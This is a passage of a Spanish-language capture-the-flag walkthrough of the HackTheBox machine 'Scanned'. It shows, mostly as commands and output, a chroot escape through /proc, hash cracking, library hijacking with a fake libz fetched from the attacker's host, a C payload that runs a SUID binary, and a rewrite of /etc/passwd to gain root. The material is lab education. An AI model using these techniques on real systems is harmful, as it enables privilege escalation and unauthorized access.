</code></pre></div><h2 id="intrusión-en-la-máquina">Intrusión en la máquina</h2><p>Genial, ahora tenemos un usuario de sistema llamado <code>clarence</code> y podemos leer archivos del servidor. Vamos a enumerar un poco más el servidor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 d /proc/1/fd/3/../..  
scanner
.
malscanner
..
viewer
templates
.gitignore
sandbox
static
manage.py
uploads
uwsgi_params
requirements.txt
malscanner.db
</code></pre></div><p>Existe un archivo de base de datos SQLite llamado <code>malscanner.db</code>. Vamos a tratar de descargarlo y abrirlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">exploit.sh</span> 10.10.11.141 f /proc/1/fd/3/../../malscanner.db &gt; malscanner.db

<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">malscanner.db</span>
malscanner.db: SQLite 3.x database, last written using SQLite version 3033745, file counter 34, database pages 32, cookie 0x42, schema 4, UTF-8, version-valid-for 34  

<span class="code-cyan">$</span> <span class="code-dark-green">sqlite3</span> <span class="mtku">malscanner.db</span>
SQLite version 3.37.0 2021-12-09 01:34:53
Enter ".help" for usage hints.
sqlite> .tables
Error: database disk image is malformed
sqlite> .exit
</code></pre></div><p>Está corrupto&mldr; Pero todavía podemos mirar las <em>strings</em> del archivo, y encontrar un <em>hash</em> MD5 para <code>clarence</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> <span class="mtku">malscanner.db</span> | <span class="code-dark-green">grep</span> clarence
md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf2021-09-14 18:39:55.237074<span class="code-red">clarence</span>2021-09-14 18:36:46.227819  
<span class="code-red">clarence</span>
</code></pre></div><p>Como se trata de un <em>hash</em> con formato Django y contiene sal, decidí usar un <em>script</em> en Go personalizado para romperlo con <code>rockyou.txt</code>: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Scanned/crack.go"><code>crack.go</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Scanned#crackgo">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">go</span> run <span class="mtku">crack.go</span> $WORDLISTS/rockyou.txt <span class="code-dark-yellow">'md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf'</span>  
[*] Algorithm:   md5
[*] Salt:        kL2cLcK2yhbp3za4w3752m
[*] Hash:        9886e17b091eb5ccdc39e436128141cf

[+] Cracked: onedayyoufeellikecrying
</code></pre></div><p>Y ya tenemos una contraseña. Afortunadamente, esta contraseña se reutiliza para SSH. Y aquí tenemos la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> clarence@10.10.11.141
clarence@10.10.11.141's password:  
<span class="code-green">clarence@scanned</span>:<span class="code-blue">~</span>$ cat user.txt
8e6287143ba5f57564bd0fb2ac7f733e
</code></pre></div><h2 id="_library-hijacking_"><em>Library Hijacking</em></h2><p>Ahora tenemos la habilidad de ejecutar <code>sandbox</code> desde la propia máquina y realizar más acciones con <em>malware</em> preparado.</p><p>Por ejemplo, podemos ejecutar binarios SUID y copiar librerías compartidas dentro de la jaula, de manera que el <em>malware</em> las utilice y podamos ejecutar comandos como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">~</span>$ find / -perm -4000 2>/dev/null  
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chsh
/usr/bin/su
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
</code></pre></div><p>Vamos a comprobar qué librerías compartidas necesitan para ejecutarse correctamente: <code>fusermount</code> necesita las librerías que ya están en la jaula, que son las mismas que utiliza <code>/bin/sh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">~</span>$ ldd /usr/bin/fusermount
        linux-vdso.so.1 (0x00007ffe36170000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1fb50e4000)  
        /lib64/ld-linux-x86-64.so.2 (0x00007f1fb52ba000)
<span class="code-green">clarence@scanned</span>:<span class="code-blue">~</span>$ ldd /bin/sh
        linux-vdso.so.1 (0x00007ffe3d5a6000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc39def7000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc39e0e5000)
</code></pre></div><p>Para construir una librerlia maliciosa Glibc, podemos utilizar <a href="https://github.com/eblazquez/fakelib.sh"><code>fakelib.sh</code></a>. Primero, tenemos que descargar <code>libc.so.6</code> a nuestra máquina de atacante.</p><p>Sin embargo, usando <a href="https://github.com/eblazquez/fakelib.sh"><code>fakelib.sh</code></a> sobre <code>libc.so.6</code> puede no funcionar correctamente. Después de algunas pruebas, encontré que <code>/usr/lib/openssh/ssh-keysign</code> es SUID y utiliza <code>libz.so.1</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">~</span>$ ldd /usr/lib/openssh/ssh-keysign
/usr/lib/openssh/ssh-keysign:
        linux-vdso.so.1 (0x00007ffdbe9e8000)
        libcrypto.so.1.1 => /lib/x86_64-linux-gnu/libcrypto.so.1.1 (0x00007f72529b4000)  
        libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007f7252997000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f72527d2000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f72527cc000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f72527aa000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7252d27000)
</code></pre></div><p>Por tanto, tenemos que descargar <code>libz.so.1</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">~</span>$ cd /
<span class="code-green">clarence@scanned</span>:<span class="code-blue">/</span>$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.11.141:1234/lib/x86_64-linux-gnu/libz.so.1  
</code></pre></div><p>Esta librería <code>libz.so.1</code> no causará errores con <a href="https://github.com/eblazquez/fakelib.sh"><code>fakelib.sh</code></a> (a lo mejor porque es más pequeña que <code>libc.so.6</code>). Ahora podemos construir una librería maliciosa para ver si el ataque funciona:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">fakelib.sh</span> -l <span class="mtku">libz.so.1</span> -o fakelibz.so.1 -g  
Generating fake library under fakelibz.so.1

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/</span>$ cd /tmp
<span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ curl 10.10.17.44/fakelibz.so.1 -so .libz.so.1  
</code></pre></div><p>Necesitamos utilizar un <em>script</em> en Bash (<code>.copy.sh</code>) para ejecutarlo justo después de <code>sandbox</code> y copiar así todos los archivos necesarios en la jaula:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">bash</span>

<span class="mtk1">dir=/var/www/malscanner/sandbox/jails</span>

<span class="mtk5">for</span> <span class="mtk1">jail</span> <span class="mtk5">in</span> <span class="mtk4">$(ls</span> <span class="mtk1">$dir</span><span class="mtk4">)</span><span class="mtk5">;</span> <span class="mtk5">do</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libcrypto.so.1.1</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>  
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libdl.so.2</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libpthread.so.0</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>

        <span class="mtk1">cp</span> <span class="mtk1">/tmp/.libz.so.1</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/libz.so.1</span>
<span class="mtk5">done</span>
</code></pre></div><p>Y el <em>malware</em> que será compilado es este <em>script</em> en C tan sencillo (<code>.exploit.c</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdlib.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">()</span> <span class="mtk1">{</span>
  <span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">);</span>
  <span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"/proc/1/fd/3/../../../../../usr/lib/openssh/ssh-keysign"</span><span class="mtk1">);</span>  
  <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Nótese que estamos ejecutanso <code>ssh-keysign</code> escapando de <code>chroot</code>, de manera que se ejecuta como binario SUID.</p><p>Después de guardarlo en la máquina, tenemos que ejecutar <code>sandbox</code> y justo después ejecutar el <em>script</em> en Bash (nótese que añadí una instrucción <code>sleep(2)</code> para tener algo de tiempo adicional). Es como si fuera una condición de carrera.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> clarence@10.10.11.141
clarence@10.10.11.141's password:
<span class="code-green">clarence@scanned</span>:<span class="code-blue">~</span>$ cd /var/www/malscanner/sandbox
<span class="code-green">clarence@scanned</span>:<span class="code-blue">/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ bash .copy.sh  
</code></pre></div><p>Y veremos la siguiente salida:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
Library hijacked!
Exited
Kill err: (3)
</code></pre></div><p>Entonces, el ataque ha funcionado. Ahora podemos ejecutar un comando personalizado con <a href="https://github.com/eblazquez/fakelib.sh"><code>fakelib.sh</code></a>. El propio <em>script</em> provee una forma de usar <code>bash</code> poniendo UID/GID como EUID/EGID:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">fakelib.sh</span> -l <span class="mtku">libz.so.1</span> -o fakelibz.so.1 -g -p bash  
Generating fake library under fakelibz.so.1

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ curl 10.10.17.44/fakelibz.so.1 -so .libz.so.1  
</code></pre></div><p>Además, necesitamos copiar <code>/bin/bash</code> y más librerías compartidas en la jaula:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ ldd /bin/bash
        linux-vdso.so.1 (0x00007fff80bec000)
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fd3ac155000)  
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fd3ac14f000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd3abf8a000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fd3ac2c4000)
</code></pre></div><p>Y entonces, este es el <em>script</em> <code>.copy.sh</code> actualizado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">bash</span>

<span class="mtk1">dir=/var/www/malscanner/sandbox/jails</span>

<span class="mtk5">for</span> <span class="mtk1">jail</span> <span class="mtk5">in</span> <span class="mtk4">$(ls</span> <span class="mtk1">$dir</span><span class="mtk4">)</span><span class="mtk5">;</span> <span class="mtk5">do</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libcrypto.so.1.1</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>  
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libdl.so.2</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libpthread.so.0</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libtinfo.so.6</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>

        <span class="mtk1">cp</span> <span class="mtk1">/bin/bash</span> <span class="mtk1">$dir/$jail/bin</span>

        <span class="mtk1">cp</span> <span class="mtk1">/tmp/.libz.so.1</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/libz.so.1</span>
<span class="mtk5">done</span>
</code></pre></div><p>Ahora realizamos el ataque otra vez:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ bash .copy.sh  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
bash-5.1# Killed subprocess
Exited
</code></pre></div><p>Nótese el <code>#</code>, por lo que tenemos <code>bash</code> ejecutado como <code>root</code>, pero el proceso muere a los 5 segundos&mldr;</p><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Para obtener una <em>shell</em> como <code>root</code> en condiciones, decidí modificar <code>/etc/passwd</code> y ponerle una contraseña a <code>root</code> usando <code>openssl</code> (formato DES Unix):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">openssl</span> passwd 7rocky  
gf2QeNVUpedfI
</code></pre></div><p>Para modificar <code>/etc/passwd</code> usaré <code>sed</code>, por lo que tendré que copiar <code>/usr/bin/sed</code> y más librerías compartidas en la jaula:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ ldd /usr/bin/sed
        linux-vdso.so.1 (0x00007fffcbeea000)
        libacl.so.1 => /lib/x86_64-linux-gnu/libacl.so.1 (0x00007fe73de49000)
        libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007fe73de1d000)  
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe73dc58000)
        libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007fe73dbc0000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe73dbba000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fe73de7a000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe73db98000)
</code></pre></div><p>Este es el archivo <code>.copy.sh</code> actualizado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">bash</span>

<span class="mtk1">dir=/var/www/malscanner/sandbox/jails</span>

<span class="mtk5">for</span> <span class="mtk1">jail</span> <span class="mtk5">in</span> <span class="mtk4">$(ls</span> <span class="mtk1">$dir</span><span class="mtk4">)</span><span class="mtk5">;</span> <span class="mtk5">do</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libacl.so.1</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libcrypto.so.1.1</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>  
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libdl.so.2</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libpcre2-8.so.0</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libpthread.so.0</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libselinux.so.1</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>
        <span class="mtk1">cp</span> <span class="mtk1">/lib/x86_64-linux-gnu/libtinfo.so.6</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/</span>

        <span class="mtk1">cp</span> <span class="mtk1">/bin/bash</span> <span class="mtk1">$dir/$jail/bin</span>
        <span class="mtk1">cp</span> <span class="mtk1">/usr/bin/sed</span> <span class="mtk1">$dir/$jail/bin</span>

        <span class="mtk1">cp</span> <span class="mtk1">/tmp/.libz.so.1</span> <span class="mtk1">$dir/$jail/lib/x86_64-linux-gnu/libz.so.1</span>
<span class="mtk5">done</span>
</code></pre></div><p>Tendremos que copiar este comando en el portapapeles para poder pegarlo tan pronto como obtengamos la <em>shell</em> como <code>root</code> (nótese que usamos <code>/proc/1/fd/3/../../../../../etc/passwd</code> para escapar de <code>chroot</code> de nuevo):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/bin/sed -i s/root:x/root:gf2QeNVUpedfI/g /proc/1/fd/3/../../../../../etc/passwd  
</code></pre></div><p>Ahora realizamos el ataque de <em>library hijacking</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ bash .copy.sh  
</code></pre></div><p>Rápidamente, copiamos el comando:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/var/www/malscanner/sandbox</span>$ ./sandbox /tmp/.exploit
Exited
bash-5.1# /bin/sed -i s/root:x/root:gf2QeNVUpedfI/g /proc/1/fd/3/../../../../../etc/passwd  
bash-5.1# Kill err: (3)
</code></pre></div><p>Y&mldr;</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ head -1 /etc/passwd
root:gf2QeNVUpedfI:0:0:root:/root:/bin/bash  
</code></pre></div><p>Hemos modificado <code>/etc/passwd</code>, por lo que tenemos acceso como <code>root</code> (con la contraseña <code>7rocky</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">clarence@scanned</span>:<span class="code-blue">/tmp</span>$ su root
Password:
root@scanned:/tmp# cat /root/root.txt  
8f587d54e14d5747055bb717dd2cc520
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración-web">Enumeración web</a></li><li><a href="#análisis-del-código-de-la-_sandbox_">Análisis del código de la <em>sandbox</em></a></li><li><a href="#análisis-de-la-aplicación-web">Análisis de la aplicación web</a></li><li><a href="#abusando-de-malas-configuraciones">Abusando de malas configuraciones</a></li><li><a href="#intrusión-en-la-máquina">Intrusión en la máquina</a></li><li><a href="#_library-hijacking_"><em>Library Hijacking</em></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>